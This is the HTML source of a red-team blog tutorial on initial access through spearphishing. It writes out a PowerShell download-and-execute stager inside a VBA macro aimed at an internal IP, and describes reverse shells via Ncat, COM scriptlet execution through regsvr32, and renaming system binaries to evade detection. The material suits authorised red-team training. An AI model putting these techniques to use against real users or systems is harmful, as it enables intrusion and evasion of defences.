@@ -1,0 +1,629 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <!--Google site verification-->
+    <meta name="google-site-verification" content="ZNGAVpLH57ubR17YFkS1kr9uWstVE5-tEmb0eAVlEX0" />
+    <!--End Google site verification-->
+    <!--Google Adsense-->
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4126413092594705"
+    crossorigin="anonymous"></script>
+     <!--End Google Adsense-->
+    <title>Advanced Red Teaming - Initial Access Techniques</title>
+    <meta http-equiv="x-ua-Compatible" content="ie=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <!--Apple Developer and Safari Webkits-->
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="default">
+    <!--Apple Developer and Safari Webkits End-->
+    <meta name="description"
+        content="This is my professional blog.">
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.11.2/css/all.css" />
+    <!-- Google Fonts Roboto -->
+    <link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700&display=swap" rel="stylesheet" />
+    <!-- MDB -->
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/mdb-ui-kit/3.10.1/mdb.min.css" rel="stylesheet" />
+    <!--<link rel="stylesheet" href="mdb.min.css" />-->
+    <!-- Custom styles -->
+    <!--<link rel="stylesheet" href="style.css" />-->
+</head>
+
+<body>
+    <!--Main Navigation-->
+    <header>
+        <!-- Intro settings -->
+        <style>
+            #intro {
+                /* Margin to fix overlapping fixed navbar */
+                margin-top: 58px;
+            }
+
+            @media (max-width: 991px) {
+                #intro {
+                    /* Margin to fix overlapping fixed navbar */
+                    margin-top: 45px;
+                }
+            }
+        </style>
+        <!-- Navbar -->
+        <nav class="navbar navbar-expand-lg navbar-dark bg-dark fixed-top">
+            <!--Container wrapper-->
+            <div class="container-fluid">
+                <!-- Toggle button -->
+                <button class="navbar-toggler" type="button" data-mdb-toggle="collapse"
+                    data-mdb-target="#navbarSupportedContent" aria-controls="navbarSupportedContent"
+                    aria-expanded="false" aria-label="Toggle navigation">
+                    <i class="fas fa-bars"></i>
+                </button>
+                <!-- Collapsible wrapper -->
+                <div class="collapse navbar-collapse" id="navbarSupportedContent">
+                    <!--Left links-->
+                    <ul class="navbar-nav me-auto mb-2 mb-lg-0">
+                        <li class="nav-item">
+                            <a class="nav-link" href="index.html">Advanced Red Teaming - APT and Adversary Emulation</a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link" href="phishing.html">Phishing Techniques</a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link" href="initial_access.html">Initial Access Techniques</a>
+                        </li>
+                        <!--<li class="nav-item">
+                            <a class="nav-link" href="purple_team_cyber_range.html">Purple Team Cyber Range</a>
+                        </li>-->
+                        </li>
+                       <li class="nav-item">
+                            <a class="nav-link" href="maintaining_persistence.html">Maintaining Persistence</a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link" href="defense_evasion.html">Defense Evasion</a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link" href="incident_response_pshell_hunting.html">Incident Response -
+                                PowerShell Hunting</a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link"
+                                href="incident_response_detecting_malicious_documents_with_sysmon.html">Incident
+                                Response - Detecting Malicious Documents With Sysmon</a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link" href="mirt_basic_static_analysis.html">Malware Incident Response - Basic Static Analysis</a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link" href="memory_forensics.html">Incident Response - Memory Forensics</a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link" href="index_base64.html">Base 64 Encoder/Decoder</a>
+                        </li>
+                    </ul>
+                    <!--Left links-->
+                </div>
+                <!-- Collapsible wrapper -->
+        </nav>
+        <!-- Navbar -->
+
+        <div id="intro" class="p-5 text-center bg-light">
+            <h1 class="display-5">Advanced Red Teaming: Initial Access - Basic and Advanced Spearphishing Techniques
+            </h1>
+
+        </div>
+        <!-- Jumbotron -->
+    </header>
+    <!--Main Navigation-->
+    <!--Main layout-->
+    <main class="mt-4 mb-5">
+        <div class="container">
+            <!--Grid row-->
+            <div class="row">
+                <!--Grid column-->
+                <div class="col-md-8 mb-4">
+                    <!--Section: Post mdb-->
+                    <section class="border-bottom mb-4">
+                        <div class="row align-items-center mb-4">
+                            <div class="col-lg-6 text-center text-lg-start mb-3 m-lg-0">
+                                <img src="IMG-9879-copy-2.webp" class="rounded shadow-1-strong me-2" height="35"
+                                    alt="Author avatar" loading="lazy" loading="lazy" />
+                                <span><strong> Blog by: Grant Knoetze</strong></span>
+
+                            </div>
+                    </section>
+                    <!--Section: Post mdb-->
+
+                    <!--Section: Text-->
+                    <section>
+                        <div class="Introduction">
+                            <p class="lead">The clever application of social engineering tactics will assist in both
+                                bypassing technologically difficult to overcome barriers to entry, as well to aid in
+                                gaining
+                                access overall. Using methods that elicit an emotional response,
+                                such as the threat that money will be deducted from the users credit card or bank
+                                account,
+                                and urging the user to "act now" or lose money. Likewise, if the target is presented
+                                with
+                                confidential information or information not
+                                meant for them, they may be urged to click through warnings. In general, when an
+                                emotional
+                                response is elicited, common sense and safe practice may be dropped by the target. It
+                                may be
+                                simpler than that, and the target may only
+                                have to be convinced to enable macros in an office document for a mundane reason such as
+                                to
+                                sign the document. One of the best social engineering attempts I have seen was a faked
+                                social media account, set up to mimic a person
+                                working in the targets same industry, the target received a direct message saying "Have
+                                you
+                                seen what people are saying about you on these professional forums? Yes, here is a link
+                                to
+                                the forum, log in with your email address
+                                and password." The target was suspicious and avoided the trap, but this is a good
+                                example of
+                                the clever application of social engineering eliciting an emotional response and urging
+                                a
+                                target to "act now".
+                            </p>
+                        </div>
+                        <div class="Spearphishing basics">
+                            <h2 class="display-6">Spearphishing with Malicious Files - Basics</h2>
+
+                            <p class="lead">Attack <em>vectors</em> refer to the means of payload delivery, ie: the
+                                spearphishing methodology (.LNK file, malicious MS Office Word or Excel macros), while
+                                the
+                                attack
+                                <em>payload</em> refers to the actual code or script that will run (usually as a dropper
+                                at
+                                this stage of the engagement, can also be part of a file-less attack through process
+                                hollowing), such as a COM object, C# delivery,
+                                and XSL stylesheet, and many, many more. The basic VBA techniques we will demonstrate
+                                now are easily detected by
+                                AV and EDR, we will use them to illustrate the basics of how one type of script can be
+                                used to download or open
+                                another script. For example, the VBA command "Shell" can be used to execute a powershell
+                                script that will use UrlDownload to
+                                download a program from somewhere else, in the following example we will use a simple
+                                VBA macro in a word document to execute Ncat.exe
+                                as a reverse shell. Remember that social engineering is required to push a user to
+                                interact with a document and enable macros, remember that AV
+                                will <em>automatically be triggered as an alert to any Auto_Open or Auto_run of any
+                                    macro inside a document</em>, given the long
+                                history of malicious macros being used as an attack vector, this is to be expected.
+                                One way of defeating spam filters is to deliver the payload via a DropBox or OneDrive
+                                link.
+                                To ensure the file is immediately downloaded and preview is bypassed, make sure the end
+                                of the link is changed from "dl=0" to "dl=1" (this technique works the same using links
+                                from OneDrive, DropBox, and Google Cloud) - <strong>ie:
+                                    https://dropbox.com/&/jhdhg383/malware.doc/dl=0 becomes
+                                    https://dropbox.com/&/jhdhg383/malware.doc/dl=1</strong>
+                            </p>
+                            <h2 class="display-6">Simple VBA Word Macro - Obfuscated with VBA Stomp ADB (adaptive
+                                document builder) - And
+                                Opening up Ncat as a Reverse
+                                Shell
+                            </h2>
+                            <p class="lead">We will use the VBA stomp adaptive document builder tool to obfuscate the
+                                embedded VBA,
+                                tool available at:</p>
+                            <a href="https://github.com/johnwax/adb" rel="noopener">ADB GitHub</a>
+                            <p class="lead">We are creating a VBA stager that will deliver a payload once the target
+                                opens up the
+                                Word or Excel document and enables macros. Create a macro inside a word document and use
+                                a simple set of Powershell commands
+                                inside the VBA command "Shell" to download and execute a powershell script: Shell
+                                "powershell.exe -WindowStyle -Hidden -c iex ((NewObject
+                                Net.WebClient).DownloadString('http://10.102.37.150:4444/ExportToXml.ps1'))"
+                                Remember to use double backslashes in your filepath when modifying the python script
+                                (single backslashes are interpreted as a newline character).
+                                In this command we use the New-Object PowerShell cmdlet to create a .NET web object
+                                and make the use of the DownloadString function from the 
+                                Net.WebClient class to download our malicious PowerShell script, 
+                                and download and execute the content.
+
+                            </p>
+                            <img src="powershell_vba.webp" class="img-fluid" shadow-1-strong rounded mb-4 loading="lazy"
+                                style="width: 100%"
+                                alt="Powershell script inside VBA Shell command to download and execute another program" />
+                            <br></br>
+                            <p class="lead">Example of a simple powershell script that runs procmon and exports the
+                                results to an XML document, this I have embedded
+                                inside the VBA stager to be downloaded and executed when the malicious document is
+                                activated.
+                            </p>
+                            <script
+                                src="https://gist.github.com/Grant-Knoetze/c0c5ee3b9a54061a3e2046cbe6ff7ff6.js"></script>
+                            <p class="lead">Install the requirements for VBA stomper</p>
+                            <img src="install_vba_stomp_requirements.webp" class="img-fluid" shadow-1-strong rounded
+                                mb-4 loading="lazy" style="width: 100%"
+                                alt="Install VBA stomp requirementss" /><br></br>
+                            <p class="lead">I run the command and successfully stomp the document.
+                            </p>
+                            <img src="stomped_document.webp" class="img-fluid" shadow-1-strong rounded mb-4
+                                loading="lazy" style="width: 100%" alt="Stomped document" /><br></br>
+                            <p class="lead">Even with defender disabled, the stomped document is still recognized, and
+                                my Ncat listener remains listening without a connection.
+                            </p>
+                            <img src="ncat_listener.webp" class="img-fluid" shadow-1-strong rounded mb-4 loading="lazy"
+                                style="width: 100%" alt="Ncat open listener" /><br></br>
+                            <p class="lead">This is a good example of how a known tool is immediately detected. All the
+                                commonly available
+                                tools are known and will be immediately detected. Thier code will have to be altered,
+                                and in an upcoming section, we will write
+                                a custom HTTP malware that will connect using Windows API's, and communicate to a
+                                Caldera-C2: All of this will be undetected and
+                                illustrate the fact that to be successful, all tools and malware will have to be custom
+                                built.
+                            </p>
+                        </div>
+                        <div class="Advanced payloads - COM objects">
+                            <h2 class="display-6">Spearphishing with Malicious Files - Advanced: COM Objects</h2>
+                            <p class="lead">COM (component object model) objects, also known as OLE-2 (object linking
+                                and embedding - version 2)
+                                is an API mechanism that allows MS Office applications to communicate and interact with
+                                each other,for example; a powershell
+                                script within an Excel document, or a word document embedded within a Powerpoint
+                                presentation. <br> COM scriptlets can be created, and will
+                                allow you to execute any script that you choose (pure script - Javascript or VBS), all
+                                in memory. <br> COM is considered obsolete with the
+                                existence of .NET and WCF (Windows communication framework), but is still allowed for
+                                backwards compatibility.<br>
+                            <ul class="lead">
+                                <li>COM scriptlets are excellent stagers for additional malware payloads</li>
+                                <li>COM scriptlets can be embedded inside an LNK file</li>
+                                <li>They are easily detected, especially for commandline signatures on regsvr32.exe or
+                                    sctobj.dll</li>
+                                <li>These files will have to be copied to %temp% or %appdata% with a different name to
+                                    bypass detections</li>
+                                <li>"Fire and forget" - Once the script is running in memory the downloader can be
+                                    removed to re
+                                    duce chances of detection
+                                </li>
+                                <li>Scriptlets can easily be executed using Windows applications -regsvr32.exe,
+                                    rundll32.exe - <br>
+                                    This can help to bypass many defenses</li>
+                                <li>Can be executed using "Shell" in VBA</li>
+                            </ul>
+                            </p>
+                            <h2 class="display-6">COM Scriptlet Example:</h2>
+                            <p class="lead">COM scriptlet with Javascript embedded. VBS may also be used.</p>
+
+                            <img src="COM_scriptlet.webp" class="img-fluid" class="img-fluid" shadow-1-strong rounded
+                                mb-4 loading="lazy" style="width: 100%;" alt="COM scriptlet with Javascript embedded" />
+                            <br></br>
+                            <h2 class="display-6">Creating a C# Backdoor from a COM Object using DotNetToJscript</h2>
+                            <a href="https://github.com/tyranid/DotNetToJScript">DotNetToJScript GitHub</a>
+                            <p class="lead">We will take a powershell.cs script (essentially a powershell code that runs
+                                from C#), we will compile this
+                                file into a .dll file (powershell as a .dll) we will then load the dll inside our
+                                Javascript code
+                                that is inside our COM object, and we execute of this through regsvr32.
+                            </p>
+                            <p class="lead">We will be starting with a powershell program written in C# - pshell.cs -
+                                main loop of the function displayed below:</p><br>
+                            <script
+                                src="https://gist.github.com/Grant-Knoetze/aa28d8cc4b4986adf2fd2da098a4b9bd.js"></script>
+
+                            <p class="lead">I have modified the code to use the main RunPSCommand to open Notepad in
+                                maximized
+                                view as an example of how the command can be used to execute commands or an operation.
+                            </p>
+                            <script
+                                src="https://gist.github.com/Grant-Knoetze/5e24a8e998d16408f12872cd9e47c14b.js"></script>
+
+                            <p class="lead">The RunPSCommand function uses the System.Management.Automation.dll -
+                                essentially the Windows Powershell we
+                                are all familiar with - included as a library in
+                                the header of pshell.cs file. </p><br>
+                            <script
+                                src="https://gist.github.com/Grant-Knoetze/42fd6372180f8ba6f63db25c2cf6072d.js"></script>
+
+                            <p class="lead">We will be using XAMMP to host an Apache server on our localhost at port 80
+                                or 443 to facilitate
+                                this task. At a later
+                                stage we will connect XAMMP to our Caldera-C2.
+                            </p>
+                            <img src="XAMMP_dashboard_and_admin_server.webp" class="img-fluid" shadow-1-strong rounded
+                                mb-4 loading="lazy" style="width: 100%;"
+                                alt="XAMMP server on localhost and dashboard" />
+                            <br></br>
+                            <p class="lead">Use the following command to compile the pshell.cs code into a dll:</p>
+                            <br>
+                            <script
+                                src="https://gist.github.com/Grant-Knoetze/14a5523f9251e6ab202aa9cf05a90aa3.js"></script>
+                            <br>
+
+                            <p class="lead">Inside XAMMP control panel open "Explorer", inside Explorer, change into the
+                                "Htdocs" directory, this is where the
+                                internet files are stored.</p>
+                            <br></br>
+                            <img src="Copy_filesct_into_htdocs.webp" class="img-fluid" shadow-1-strong rounded mb-4
+                                loading="lazy" style="width: 100%"
+                                alt="Copy file.sct into htdocs inside XAMMP file explorer" />
+                            <br></br>
+                            <p class="lead">Test by typing "/file.sct" into your browser after localhost, the scriptlet
+                                should be
+                                rendered.</p>
+                            <img src="File_sct_in_browser.webp" class="img-fluid" shadow-1-strong rounded mb-4
+                                style="width: 100%" loading="lazy" alt="Scriptlet in browser" /><br></br>
+                            <p class="lead">Use the following command to download the COM scriptlet and execute its code
+                                in memory. Interestingly,
+                                you will notice that we use the "u" for uninstall, as to install in regsvr32 requires
+                                administrator privileges, but
+                                to uninstall does not, and will keep executing the same code as it appears in the
+                                scriptlet during uninstall.
+                            </p>
+                            <br>
+                            <script
+                                src="https://gist.github.com/Grant-Knoetze/4effd64294da08d144c5e13c2a4ddcc8.js"></script>
+                            <br></br>
+                            <img src="access_denied_regsvr32.webp" class="img-fluid" shadow-1-strong rounded mb-4
+                                loading="lazy" style="width: 100%; " alt="Access denied" />
+                            <br></br>
+                            <p class="lead">As seen above, detection occurs in the command line, copy regsvr32 and
+                                scrobj.dll
+                                into %TEMP% and rename them. In the following set of snapshots you will see how
+                                I have copied and renamed regsvr32 and scrobj.dll into %TEMP% and renamed them to
+                                sophia.exe and alexis.dll respectively. Using https is a helpful to bypass IDS or IPS in
+                                some
+                                settings, for example where SSL strip and other advanced endpoint detection methods are
+                                not in use. </p>
+                            <br></br>
+                            <img src="copy_regsvr32exe_to_temp_rename_sophiaexe.webp" class="img-fluid" shadow-1-strong
+                                rounded mb-4 loading="lazy" style="width: 100%;"
+                                alt="Copy regsvr32 to %TEMP%" /><br></br>
+                            <br>
+                            <img src="copy_scrobjdll_temp_rename_alexisdll.webp" class="img-fluid" shadow-1-strong
+                                rounded mb-4 loading="lazy" style="width: 100%; "
+                                alt="Copy scrobj.dll into %TEMP%" /><br></br>
+                            <br></br>
+                            <p class="lead">Success in the command line from %TEMP%.</p>
+                            <img src="running_from_temp.webp" class="img-fluid" shadow-1-strong rounded mb-4
+                                loading="lazy" style="width: 100%" alt="Success in the command line from %TEMP%" />
+                            <br></br>
+                            <p class="lead">Next we use the following command to compile pshell.cs into a dll using
+                                csc.exe (C# compiler).</p>
+                            <br>
+                            <script
+                                src="https://gist.github.com/Grant-Knoetze/6dccb72e649ddceaea8a4406f763227d.js"></script>
+
+                            <img src="Success_compiling_pshelldll.webp" class="img-fluid" shadow-1-strong rounded mb-4
+                                loading="lazy" style="width: 100%;"
+                                alt="csc.exe compile pshell.cs to pshell.dll" /><br></br>
+                            <br></br>
+                            <p class="lead">We will be using DotNetToJScript <a
+                                    href="https://github.com/tyranid/DotNetToJScript"
+                                    rel="noopener">DotNetToJScript</a>to compile a
+                                Javascript file from the DLL using the following command </p><br>
+                            <script
+                                src="https://gist.github.com/Grant-Knoetze/87a0871b4606d66d88d549f1b0f6199e.js"></script>
+                            <br>
+                            <p class="lead">DotNetToJScript to uses a .NET feature called serialization in C# to do
+                                this, see the MSDN documents for serialization
+                                here <a
+                                    href="https://docs.microsoft.com/en-us/dotnet/csharp/programming-guide/concepts/serialization/">MSDN
+                                    serialization</a>
+                            </p>
+                            <br></br>
+                            <p class="lead">As seen in the screenshot below, we now have pshell.js file compiled.</p>
+                            <img src="Dotnettojscript_worked_compiled_pshelljs.webp" class="img-fluid" shadow-1-strong
+                                rounded mb-4 loading="lazy" style="width: 100%;"
+                                alt="csc.exe compile pshell.cs to pshell.dll" />
+                            <br></br>
+                            <p class="lead">When we open the pshell.js file in our editor, we see the serialized C#
+                                object converted into assembly and encoded in base64. It then converts the code from
+                                base64 into
+                                binary data. It will then de-serialize this into code that can be run.
+                            </p>
+                            <br></br>
+                            <img src="pshelljs_code.webp" class="img-fluid" shadow-1-strong rounded mb-4 loading="lazy"
+                                style="width: 100%;" alt="pshell.js code opened up in Visual Studio Code" />
+                            <img src="base64_to_binary_formatter.webp" class="img-fluid" shadow-1-strong rounded mb-4
+                                loading="lazy" style="width: 100%;" alt="Binary formatter" />
+                            <br></br>
+                            <p class="lead">This part of the code creates an instance of the main class, 'TestClass'</p>
+                            <img src="TestClass.webp" class="img-fluid" shadow-1-strong rounded mb-4 loading="lazy"
+                                style="width: 100%" alt="TestClass" />
+                            <br></br>
+                            <p class="lead">When we look at our pshell.cs code, we see that the main function Execute()
+                                is
+                                inside the public class TestClass()
+                            </p>
+                            <br></br>
+                            <img src="Function_inside_testclass.webp" class="img-fluid" shadow-1-strong rounded mb-4
+                                loading="lazy" style="width: 100%" alt="Main function embedded inside TestClass" />
+                            <br></br>
+
+                            <p class="lead">Use cscript.exe to test the script, Notepad should open</p>
+                            <img src="cscript_test.webp" class="img-fluid" shadow-1-strong rounded mb-4 loading="lazy"
+                                style="width: 100%" alt="Testing with cscript.exe" />
+                            <br></br>
+                            <p class="lead">This code can now be copied and pasted inside your COM scriptlet (the entire
+                                code from pshell.js)</p>
+                            <p class="lead">We now have a Javascript application that runs C# code, all inside a COM
+                                scriptlet. Copy and past the file inside htdocs in XAMMP Explorer.</p>
+                            <img src="pshellsct_xammp.webp" class="img-fluid" shadow-1-strong rounded mb-4
+                                loading="lazy" style="width: 100%" alt="pshell.sct in XAMMP" />
+                            <br></br>
+                            <p class="lead">Test from the server and also from the command line.
+                                <br></br> This concludes our illustration of how much can be done using COM scriptlets.
+                            </p>
+
+
+
+
+                        </div>
+                    </section>
+                    <!--Section: Share buttons-->
+                    <section class="text-center border-top border-bottom py-4 mb-4">
+                        <p><strong>Share this with your network</strong></p>
+                        <a href="https://twitter.com" class="btn btn-primary m-1" role="button" target="_blank">
+                            <i class="fab fa-twitter"></i>
+                        </a>
+                        <a href="https://www.linkedin.com" class="btn btn-primary m-1" role="button" target="_blank">
+                            <i class="fab fa-linkedin"></i>
+                        </a>
+
+                    </section>
+                    <!--Section: Share buttons-->
+
+                    <!--Section: Author-->
+                    <section class="border-bottom mb-4 pb-4">
+                        <div class="row">
+                            <div class="col-3">
+                                <!---- <img src="IMG-9879-copy-2.webp" class="img-fluid shadow-1-strong rounded" loading="lazy"
+                                    alt="Author avatar" />
+                            </div>-->
+                                <!---- <div class="col-9">-->
+                                <section class="text-left border-top border-bottom py-4 mb-4">
+                                    <p class="mb-2"><strong>Grant Knoetze</strong></p>
+                                    <p>
+                                        IT Support Specialist Cybersecurity Analyst Software Developer
+                                    </p>
+                            </div>
+                    </section>
+                    <!--Section: Author-->
+                </div>
+                <!--Grid column-->
+
+                <!--Grid column-->
+                <div class="col-md-4 mb-4">
+                    <!--Section: Sidebar-->
+                    <section class="sticky-top" style="top: 80px;">
+                    </section>
+                    <!--Section: Ad-->
+                    <section class="text-center border-bottom pb-4 mb-4">
+                        <div class="bg-image hover-overlay ripple mb-4">
+                            <!---- <img src="" class="img-fluid" />-->
+                            <a href="https://github.com/Grant-Knoetze/c--red-team-code" target="_blank">
+                                <div class="mask" style="background-color: rgba(57, 192, 237, 0.2);"></div>
+                            </a>
+                        </div>
+                        <p class="lead"> Develop your own communications programs that beacon to a custom command and
+                            control server. This is the only reliable way to beat antivirus, EDR, IPS and IDS, but
+                            social engineering is
+                            generally required to overcome certain technical obstacles.
+                            Maintain persistence like this, and insure that the program is run,
+                            and is as <em>undedectable as possible</em> to incident handlers or threat hunters,
+                            for more on the benefits of remaining
+                            undetected, as well as how to do so in C++ in our custom RedTeamAgent.cpp (follow the link
+                            below to learn more).
+                            Disclaimer - Nothing
+                            on this page is intended for malicious purposes,
+                            anything that you do with any code is <em>your own
+                                responsibility</em>, <b>never engage a target without written permission in the form of
+                                a signed contract.</b>
+                        </p>
+                        <a class="nav-link" href="defense_evasion.html">Defense Evasion.</a>
+
+
+                    </section>
+                    <!--Section: Sidebar-->
+                </div>
+                <!--Grid column-->
+            </div>
+            <!--Grid row-->
+        </div>
+    </main>
+    <!--Main layout-->
+    </section>
+    <!--Footer-->
+    <footer class="bg-light text-lg-start">
+        <hr class="m-0" />
+
+        <div class="text-center py-4 align-items-center">
+            <p>Follow me on social media</p>
+            <a href="https://twitter.com/KnoetzeGrant" class="btn btn-primary m-1" role="button" rel="nofollow"
+                target="_blank">
+                <i class="fab fa-twitter"></i>
+            </a>
+            <a href="https://github.com/Grant-Knoetze" class="btn btn-primary m-1" role="button" rel="nofollow"
+                target="_blank">
+                <i class="fab fa-github"></i>
+            </a>
+            <a href="https://www.linkedin.com/in/grant-knoetze-563b0b1b6/" class="btn btn-primary m-1" role="button"
+                rel="nofollow" target="_blank">
+                <i class="fab fa-linkedin"></i>
+            </a>
+        </div>
+        <!-- Copyright -->
+        <div class="text-center p-3" style="background-color: rgba(0, 0, 0, 0.2);">
+            © 2025 Copyright: Grant Knoetze
+        </div>
+        <!-- Copyright -->
+    </footer>
+    <!--Footer-->
+    <!-- MDB -->
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mdb-ui-kit/3.10.1/mdb.min.js"></script>
+    <!-- Custom scripts -->
+    <script type="text/javascript"></script>
+    <!-- Google Tag Manager -->
+    <script type="text/javascript"
+        src="https://gc.kis.v2.scr.kaspersky-labs.com/FD126C42-EBFA-4E12-B309-BB3FDD723AC1/main.js?attr=FyAvnV26jgbcxptBeyJ0P1rB6D8Gp4pcXgqZAmh1c9gh8ZhfdxA4DafLZmI1xkzHmm3zxtFCJeLRHK96tqGvfmaywWn3Kty6w0MV4C805MMkGIRUnrIGrRIim13trBSPPfGPzRmeaVnCnntOIY7BHbdR36EVWuuLYGySkYSKiVtwdrU5jEZtgQh_uWXM6x8y"
+        charset="UTF-8"></script>
+    <link rel="stylesheet" crossorigin="anonymous"
+        href="https://gc.kis.v2.scr.kaspersky-labs.com/E3E8934C-235A-4B0E-825A-35A08381A191/abn/main.css?attr=aHR0cHM6Ly9nYXJnb3lsZS5hc2Vydi5jby56YToyMDgzL2Nwc2VzczYxNDg3OTM3NzMvZG93bmxvYWQ_c2tpcGVuY29kZT0xJmZpbGU9JTJmaG9tZSUyZmdyYW50Y2NiJTJmcHVibGljX2h0bWwlMmZpbmRleC5odG1s" />
+    <script>
+        (function (w, d, s, l, i) {
+            w[l] = w[l] || [];
+            w[l].push({
+                'gtm.start': new Date().getTime(),
+                event: 'gtm.js'
+            });
+            var f = d.getElementsByTagName(s)[0],
+                j = d.createElement(s),
+                dl = l != 'dataLayer' ? '&l=' + l : '';
+            j.async = true;
+            j.src =
+                'https://www.googletagmanager.com/gtm.js?id=' + i + dl;
+            f.parentNode.insertBefore(j, f);
+        })(window, document, 'script', 'dataLayer', 'GTM-K4QRS88');
+    </script>
+    <!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-FETHGQJWZF"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-FETHGQJWZF');
+</script>
+    <!-- End Google Tag Manager -->
+    <!-- Google Tag Manager (noscript) -->
+    <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-K4QRS88" height="0" width="0"
+            style="display:none;visibility:hidden"></iframe></noscript>
+    <!-- End Google Tag Manager (noscript) -->
+      <!--Core Web Vitals-->
+    <script type="module">
+        import {onCLS, onINP, onLCP} from 'https://unpkg.com/web-vitals@4?module';
+        function sendToGoogleAnalytics({name, delta, id}) {
+  // Assumes the global `gtag()` function exists, see:
+  // https://developers.google.com/analytics/devguides/collection/gtagjs
+  gtag('event', name, {
+    event_category: 'Web Vitals',
+    // Google Analytics metrics must be integers, so the value is rounded.
+    // For CLS the value is first multiplied by 1000 for greater precision
+    // (note: increase the multiplier for greater precision if needed).
+    value: Math.round(name === 'CLS' ? delta * 1000 : delta),
+    // The `id` value will be unique to the current page load. When sending
+    // multiple values from the same page (e.g. for CLS), Google Analytics can
+    // compute a total by grouping on this ID (note: requires `eventLabel` to
+    // be a dimension in your report).
+    event_label: id,
+    // Use a non-interaction event to avoid affecting bounce rate.
+    non_interaction: true,
+  });
+}
+
+onCLS(sendToGoogleAnalytics);
+onINP(sendToGoogleAnalytics);
+onLCP(sendToGoogleAnalytics);
+      
+        onCLS(console.log);
+        onINP(console.log);
+        onLCP(console.log);
+      </script>
+      <!--Core Web Vitals End-->
+</body>
+
+
+</html>
